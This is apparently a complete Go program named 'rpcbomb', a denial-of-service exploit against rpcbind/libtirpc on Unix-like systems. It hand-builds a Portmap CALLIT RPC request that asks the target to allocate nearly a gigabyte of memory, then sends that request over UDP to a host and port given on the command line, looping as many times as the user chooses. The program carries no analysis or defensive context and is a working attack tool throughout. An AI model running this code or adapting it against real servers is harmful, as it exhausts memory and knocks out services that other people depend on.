package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

type rpcPayload struct {
	xid         uint32
	messageType uint32
	RPCVer      uint32
	program     uint32
	programver  uint32
	procedure   uint32
	username    uint32
	usernamelen uint32
	cred        uint32
	credlen     uint32
	programzero uint32
	ver         uint32
	proc        uint32
	arglen      uint32
	memassign   uint32
}

type ImageHeader struct {
	Signature   [3]byte
	Version     uint32
	IsGrayscale bool
	NumSections uint32
}

func CheckError(err error) {
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(0)
	}
}

func main() {
	startTime := time.Now() // Store start time

	bomb := `
                                 + # ,
                           : @ @ @ @ @ @
               @ @ ; . + @ @ @ .       @ @
                 @ @ @ @ @             @ @
                                 .     @ #
                     ; @ @ @ . : @ @ @ @
                 @ @ @ @ @ @ @ @ @ @ @ ;
               @ @ @ @ @ @ @ @ @ @ @ @ @
             @ @ @ @ @ @ @ @ @ @ @ @ @ @ :
           # @ @ @ @ @ @ @ @ @ @ @ @ @ '
           @ @ @ @ @ @ @ @ @ @ @ @ @ @ @
         . @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ .
         + @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ +
         + @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ +
         : @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ :
           @ @ @ @ @ @ @ @ @ @ @ @ @ @ @
           @ @ @ @ @ @ @ @ @ @ @ @ @ @ ,
             @ @ @ @ @ @ @ @ @ @ @ @ @
             , @ @ @ @ @ @ @ @ @ @ @
                 @ @ @ @ @ @ @ @ @
                   , @ @ @ @ @

     r p c b o m b
     DoS exploit for *nix rpcbind/libtirpc.
     Based on the work from Guido Vranken.
     https://guidovranken.wordpress.com/

     (c) 2017 Joshua Magady.
	`
	fmt.Println(bomb)

	ptrHost := flag.String("host", "REQUIRED", "This is the target host of the attack (IP Address)") // Create Host flag
	ptrNumBytes := flag.Int("numbytes", 999999999, "This the number of bytes to try an allocate")    // create numBytes flag
	ptrPort := flag.Int("port", 111, "This is the port RPC Bind is running on")                      // create Port flag
	ptrLoop := flag.Int64("loop", 1, "The number of times to loop (max=5000000000000000000)")        // Create Loop Flag

	flag.Parse() // Parse all Flags

	fmt.Println("Target Host:", *ptrHost)                                // Print Host flag
	fmt.Println("Number of Bytes to allocate (per loop):", *ptrNumBytes) // Print the number of bytes
	fmt.Println("Target Port:", *ptrPort)                                // Print the Port Number

	buf := new(bytes.Buffer)      // Binary Writer Buffer
	byteOrder := binary.BigEndian // Set the Byte Order

	// RPC Byte Code
	binary.Write(buf, byteOrder, uint32(0))            // xid
	binary.Write(buf, byteOrder, uint32(0))            // Message Type: CALL (0)
	binary.Write(buf, byteOrder, uint32(2))            // RPC Version: 2
	binary.Write(buf, byteOrder, uint32(100000))       // Program: Portmap (100000)
	binary.Write(buf, byteOrder, uint32(4))            // Program Version: 4 (old Value: 2)
	binary.Write(buf, byteOrder, uint32(9))            // Procedure: CALLIT (9) (old Value 5)
	binary.Write(buf, byteOrder, uint32(0))            // Credentials Flavor: AUTH_NULL (0)
	binary.Write(buf, byteOrder, uint32(0))            // Length: 0
	binary.Write(buf, byteOrder, uint32(0))            // Credentials Verifier: AUTH_NULL (0)
	binary.Write(buf, byteOrder, uint32(0))            // Length: 0
	binary.Write(buf, byteOrder, uint32(0))            // Program: Unknown (0)
	binary.Write(buf, byteOrder, uint32(0))            // Version: 0 (old Value 1)
	binary.Write(buf, byteOrder, uint32(4))            // Procedure: 4 (old Value 1)
	binary.Write(buf, byteOrder, uint32(4))            // Argument Length
	binary.Write(buf, byteOrder, uint32(*ptrNumBytes)) // Argument (Payload)

	fmt.Printf("Payload: %x\n", buf.Bytes()) // Show Payload that will be sent

	for i := 0; int64(i) < *ptrLoop+1; i++ {
		serverAddr, err := net.ResolveUDPAddr("udp", *ptrHost+":"+strconv.Itoa(*ptrPort)) // Resolves the Attack Target
		CheckError(err)                                                                   // Check the error

		localAddr, err := net.ResolveUDPAddr("udp", ":0") // Resolves localhost
		CheckError(err)                                   // Check the error

		conn, err := net.DialUDP("udp", localAddr, serverAddr) // setup the connection
		CheckError(err)                                        // Check the error

		timeOut := time.Now().Local().Add(time.Second * time.Duration(30)) // Set Read timeout (10 Secs) variable
		conn.SetReadDeadline(timeOut)                                      // Set the actual Timeout

		//conn.Close() // Close connection

		_, errr := conn.Write(buf.Bytes()) // Send UDP packet to Server

		CheckError(errr) // Check for errors from sending the packet
		//buf.Reset() // reset the buffer

		bufR := make([]byte, 1024)             // Receive Buffer
		n, addr, err := conn.ReadFromUDP(bufR) // wait for response (Or Timeout)
		conn.Close()                           // Close connection
		if err != nil {
			fmt.Println("No response from server received.")
		} else if int64(i) == *ptrLoop {
			fmt.Println("Allocated", *ptrNumBytes*i, "bytes at host", *ptrHost, "on port", *ptrPort)
			fmt.Printf("Received Messgae: %x", bufR[0:n])
			fmt.Println(" from ", addr)
			fmt.Println("\nDamn it feels good to be a gangster.")
		} else {
			now := time.Now()            // Capture the time at this point
			elapse := now.Sub(startTime) // calculate the time difference between now and when the program started

			fmt.Printf("\r Loop %[1]d/%[2]d - Elapsed Time: %[3]v", i, *ptrLoop, elapse)
		}
	}
}
